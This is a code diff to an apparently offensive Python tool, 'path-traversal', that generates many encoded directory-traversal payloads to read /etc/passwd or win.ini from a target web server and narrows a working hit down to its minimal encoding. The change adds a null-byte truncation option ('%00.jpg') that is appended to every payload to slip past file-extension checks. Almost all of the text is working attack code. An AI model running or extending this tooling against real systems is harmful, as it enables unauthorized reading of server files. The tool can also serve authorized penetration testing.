@@ -34,15 +34,20 @@ BOLD   = '\033[1m'
 RESET  = '\033[0m'
 CLEAR  = '\033[2K'
 
-VERSION = "1.7.0"
+VERSION = "1.8.0"
 
 # ── Payload Builder ─────────────────────────────────────────────────────────
 
-def build_encodings(base_path: str, depth: int, platform: str) -> list[dict]:
+def build_encodings(base_path: str, depth: int, platform: str,
+                    nullbyte: Optional[str] = None) -> list[dict]:
     """
     Build all encoding variations of the traversal payload.
     Returns list of {name, payload, note} dicts.
     payload is the raw string to place in the URL (pre-URL-encoded as needed).
+
+    nullbyte: optional suffix (e.g. ".jpg") — when set, every payload gets a
+    null-byte truncation suffix appended ("%00.jpg") to bypass extension checks
+    (classic PHP < 5.3.4 behavior).
     """
     if platform == "windows":
         target  = "windows\\win.ini"
@@ -58,9 +63,22 @@ def build_encodings(base_path: str, depth: int, platform: str) -> list[dict]:
     if bp:
         bp = bp.rstrip('/\\') + '/'
 
+    # Build null-byte suffix: user gives ".jpg", "jpg", or "%00.jpg" -> "%00.jpg"
+    nbsuffix = ""
+    if nullbyte:
+        ext = nullbyte.strip()
+        if ext.lower().startswith("%00"):
+            ext = ext[3:]
+        if not ext.startswith("."):
+            ext = "." + ext
+        nbsuffix = "%00" + ext
+
     encodings = []
 
     def add(name: str, payload: str, note: str):
+        if nbsuffix:
+            payload = payload + nbsuffix
+            note = note + f" [null-byte {nbsuffix}]"
         encodings.append(dict(name=name, payload=payload, note=note))
 
     # ── 1. Raw ───────────────────────────────────────────────────────────────
@@ -107,7 +125,10 @@ def build_encodings(base_path: str, depth: int, platform: str) -> list[dict]:
     add("fullwidth", bp + fw, "Fullwidth Unicode (．．／...)")
 
     # ── 10. Null byte suffix ──────────────────────────────────────────────────
-    add("null-byte", bp + raw_trav + "%00", "Null byte truncation (%00 ...)")
+    # When -n is set, every variant already carries the suffix, so this
+    # standalone entry is only added for the default (no -n) case.
+    if not nbsuffix:
+        add("null-byte", bp + raw_trav + "%00", "Null byte truncation (%00 ...)")
 
     # ── 11. Trailing space ────────────────────────────────────────────────────
     add("trailing-space", bp + raw_trav + "%20", "Trailing space (%20)")
@@ -221,11 +242,14 @@ def build_encodings(base_path: str, depth: int, platform: str) -> list[dict]:
 
 
 def minimize_payload(base_url: str, base_path: str, depth: int, platform: str,
-                     timeout: int, live: bool):
+                     timeout: int, live: bool, nullbyte: Optional[str] = None):
     """
     When a fully-encoded payload hits 200, try progressively simpler encodings
     (raw -> slash-only -> dot-only -> single-sep -> double-sep -> ...) and return
     the most minimal payload that still returns 200.
+
+    nullbyte: optional extension suffix — appended as %00<ext> to each ladder
+    payload to bypass extension checks.
 
     Returns dict: {name, url, resp} or None if nothing simpler works.
     """
@@ -236,6 +260,16 @@ def minimize_payload(base_url: str, base_path: str, depth: int, platform: str,
     bp = base_path
     if bp:
         bp = bp.rstrip('/\\') + '/'
+
+    # Build null-byte suffix (same logic as build_encodings)
+    nbsuffix = ""
+    if nullbyte:
+        ext = nullbyte.strip()
+        if ext.lower().startswith("%00"):
+            ext = ext[3:]
+        if not ext.startswith("."):
+            ext = "." + ext
+        nbsuffix = "%00" + ext
 
     # Ladder from simplest to most encoded — first 200 is the minimal working form.
     # Order matters: try the least-encoded variants first so we stop at the minimal one.
@@ -250,6 +284,8 @@ def minimize_payload(base_url: str, base_path: str, depth: int, platform: str,
         ("double-full",  bp + "".join(f"%25{ord(c):02x}" for c in raw_trav)),
         ("triple-full",  bp + "".join(f"%2525{ord(c):02x}" for c in raw_trav)),
     ]
+    if nbsuffix:
+        ladder = [(name, payload + nbsuffix) for name, payload in ladder]
 
     print(f"\n  {'─' * 60}")
     print(f"  Minimizing… trying simpler encodings (first 200 = minimal):")
@@ -405,6 +441,7 @@ Examples:
   path-traversal -u http://example.com/file?file=var/www -p windows
   path-traversal -u http://example.com/file?file= -d 10
   path-traversal -u http://example.com/file?file= -t 5 -o
+  path-traversal -u http://example.com/upload?file= -n .jpg
         """
     )
     parser.add_argument("-u", "--url", required=True,
@@ -415,6 +452,8 @@ Examples:
                         help="Directory traversal depth (default: 10)")
     parser.add_argument("-t", "--threads", type=int, default=1,
                         help="Concurrent threads (default: 1)")
+    parser.add_argument("-n", "--nullbyte", metavar="EXT",
+                        help="Append a null-byte truncation suffix to every payload, e.g. -n .jpg -> %%00.jpg (bypasses extension checks)")
     parser.add_argument("--timeout", type=int, default=10,
                         help="Request timeout in seconds (default: 10)")
     parser.add_argument("-o", "--only-interesting", action="store_true",
@@ -439,6 +478,7 @@ def main():
     base_url = args.url.rstrip("&?")
     depth = args.depth
     platform = args.platform
+    nullbyte = args.nullbyte
 
     # Determine base path from URL (everything after last '=' is the base path)
     base_path = ""
@@ -446,7 +486,7 @@ def main():
         base_path = base_url.split("=", 1)[1]
         base_url = base_url.split("=", 1)[0] + "="
 
-    encodings = build_encodings(base_path, depth, platform)
+    encodings = build_encodings(base_path, depth, platform, nullbyte)
 
     # Attach the full URL to each encoding so we can display it later
     for enc in encodings:
@@ -459,6 +499,8 @@ def main():
     print(f"  {CYAN}File:{RESET}    {GREEN}{BOLD}/etc/passwd{RESET}{' (unix)' if platform == 'unix' else ' (windows)'}")
     print(f"  {CYAN}Depth:{RESET}   {BOLD}{depth}{RESET} directories")
     print(f"  {CYAN}Tests:{RESET}   {BOLD}{len(encodings)}{RESET} encoding variations")
+    if nullbyte:
+        print(f"  {CYAN}Nullbyte:{RESET} {BOLD}%00{nullbyte.strip().lstrip('%00')}{RESET}")
     print(f"  {'─' * 60}\n")
 
     # ── Results ──────────────────────────────────────────────────────────────
@@ -523,7 +565,7 @@ def main():
     # If the working hit was an encoded payload, try to minimize it
     if found_200 and hit_enc and ("%2" in hit_enc["payload"] or "%25" in hit_enc["payload"]):
         minimized = minimize_payload(base_url, base_path, depth, platform,
-                                     args.timeout, live)
+                                     args.timeout, live, nullbyte)
         if minimized:
             hit_enc["url"] = minimized["url"]
             hit_enc["name"] = f"{minimized['name']} (minimal)"
